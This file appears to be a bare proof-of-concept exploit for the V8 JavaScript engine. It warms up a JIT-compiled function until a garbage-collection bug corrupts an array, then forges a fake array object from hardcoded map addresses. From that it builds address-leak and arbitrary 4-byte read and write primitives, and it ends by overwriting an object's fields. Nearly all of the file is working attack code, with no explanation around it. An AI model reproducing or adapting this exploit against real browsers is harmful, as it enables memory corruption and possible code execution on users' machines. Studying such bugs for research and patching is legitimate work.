// function dp(obj) {%DebugPrint(obj)}
// function dpp(ptr) {%DebugPrintPtr(ptr)}

let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let i64 = new BigUint64Array(buf);
let i32 = new Uint32Array(buf);

function itof(val) {
    i64[0] = BigInt(val);
    return f64[0];
}

function ftoi(val) {
    f64[0] = val;      
    return i64[0];
}

function pair_32_to_f(low, high)
{
    i32[0] = low;
    i32[1] = high;
    return f64[0];
}
function foo(x) {
    let a = 0.01;
    let a1 = 0.02, a2 = 0.03, a3 = 0.04, a4 = 0.05, a5 = 0.06, a6 = 0.07, a7 = 0.08, a8 = 0.09;
    let a9 =0.10, a10 = 0.11
    let b = 12.1, c = 2.199998856533867286;
    // let arr = [{}, {}, {}, {}, {}, {}, {}];
    let arr = [2.1999988565467671897, 2.2, 3.3, 4.4, 5.5, 6.6] // fake object in this array
    let dummy1 = {lmao : 1, 1: 12.12, 2: 2.12};
    let dummy2 = {a : 1}
    // let dummy3 = {b : 1}
    // let dummy4 = {c : 1}
    a += x; // create float64 for GetTaggedValue->AddNewNode<Float64ToTagged>
    a1 += x; 
    a2 += x; // create float64 for GetTaggedValue->AddNewNode<Float64ToTagged>
    a3 += x; // create float64 for GetTaggedValue->AddNewNode<Float64ToTagged>      
    a4 += x; // create float64 for GetTaggedValue->AddNewNode<Float64ToTagged>
    a5 += x; // create float64 for GetTaggedValue->AddNewNode<Float64ToTagged>
    a6 += x; // create float64 for GetTaggedValue->AddNewNode<Float64ToTagged>
    a7 += x; // create float64 for GetTaggedValue->AddNewNode<Float64ToTagged>
    a8 += x; // create float64 for GetTaggedValue->AddNewNode<Float64ToTagged>
    a9 += x; // create float64 for GetTaggedValue->AddNewNode<Float64ToTagged>
    a10 += x; // create float64 for GetTaggedValue->AddNewNode<Float64ToTagged>
    b += c; // create float64constant for BuildInlinedAllocationForHeapNumber
    function inner()
    {
        return arguments; // arr
    }
    let d = inner(b, a, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, dummy1, dummy2, arr);
    // do_nothing(d)
    return [d, arr];
}

for(let i = 0; i < 1000; i++) {
    foo(1.0 + i);
}
const PACK_DOUBLE_ELE_MAP = 0x189a41
const PACK_ELE_MAP = 0x189ac9
const EMPTY_FIXED_ARRAY = 0x745



let tmp
let i = 0;
for(i = 0; i < 3000; i++) {
    // let start = performance.now();
    tmp = foo(1.0 + i);
    // let end = performance.now();
    // console.log("Time taken for iteration " + i + ": " + (end - start) + " milliseconds");
    // console.log(i);
    if(!Array.isArray(tmp[1])) break;
    // if(i >= 1000 && (end - start) >= 0.2)
    //     {
    //         // console.log("Time taken for iteration " + i + ": " + (end - start) + " milliseconds");
    //         // console.log(i);
    //         // dp(tmp)
    //         break
    //     };
}
var fakeObjArrEle = 0x20d899
var fakeObjArr = [pair_32_to_f(PACK_DOUBLE_ELE_MAP, EMPTY_FIXED_ARRAY),
                pair_32_to_f(fakeObjArrEle, 0x10),  // elements and length
                0, 0, 0, 0, 0, 0, 0, 0, 0] 
var fakeObj;
function addrOf(obj)
{
    fakeObjArr[0] = pair_32_to_f(PACK_ELE_MAP, EMPTY_FIXED_ARRAY)
    fakeObj[0] = obj
    fakeObjArr[0] = pair_32_to_f(PACK_DOUBLE_ELE_MAP, EMPTY_FIXED_ARRAY)
    let ret = ftoi(fakeObj[0]) & 0xffffffffn
    fakeObjArr[0] = pair_32_to_f(PACK_DOUBLE_ELE_MAP, EMPTY_FIXED_ARRAY)
    fakeObjArr[1] = pair_32_to_f(fakeObjArrEle + 0x20, 0x222)// elements and length
    return ret;
}
function read_4(addr)
{
    fakeObjArr[0] = pair_32_to_f(PACK_DOUBLE_ELE_MAP, EMPTY_FIXED_ARRAY)
    fakeObjArr[1] = pair_32_to_f(Number(addr) - 0x38, 0x222) // use index 6 since read may change data near the addr
    let ret = ftoi(fakeObj[6]) & 0xffffffffn;
    fakeObjArr[0] = pair_32_to_f(PACK_DOUBLE_ELE_MAP, EMPTY_FIXED_ARRAY)
    fakeObjArr[1] = pair_32_to_f(fakeObjArrEle + 0x20, 0x222)// elements and length
    return ret;
}

function write_4(addr, val)
{
    fakeObjArr[0] = pair_32_to_f(PACK_DOUBLE_ELE_MAP, EMPTY_FIXED_ARRAY)
    fakeObjArr[1] = pair_32_to_f(Number(addr) - 8, 0x222)
    let old = ftoi(fakeObj[0])
    old = (old & 0xffffffff00000000n) | (BigInt(val) & 0xffffffffn)
    fakeObj[0] = itof(old)
    fakeObjArr[0] = pair_32_to_f(PACK_DOUBLE_ELE_MAP, EMPTY_FIXED_ARRAY)
    fakeObjArr[1] = pair_32_to_f(fakeObjArrEle + 0x20, 0x222)// elements and length
}



if(i == 2000)
    console.log("fail1");
else
{
    console.log("scavenge  trigged");
    print(i)
    let corrupted = tmp[1];
    // dp(tmp)
    if(Array.isArray(corrupted))
        console.log("fail2");
    else
    {
        fakeObj = corrupted[0]
        // dp(tmp)
    }
    // dp(tmp)
    // tmp[0]
}
if(fakeObj == undefined)
    console.log("fail3");
else
{
    if(Array.isArray(fakeObj))
    {
        console.log("success");
        // dp(fakeObj)
        let abc = {a: 1, b: 2}
        console.log("Addr: 0x" + addrOf(abc).toString(16));
        write_4(addrOf(abc) + 0xcn, 0x44444444)
        console.log("a: "   + abc.a);
        console.log("b: "   + abc.b);
    }
    else
    {
        // console.log("fail4");
    }
   
}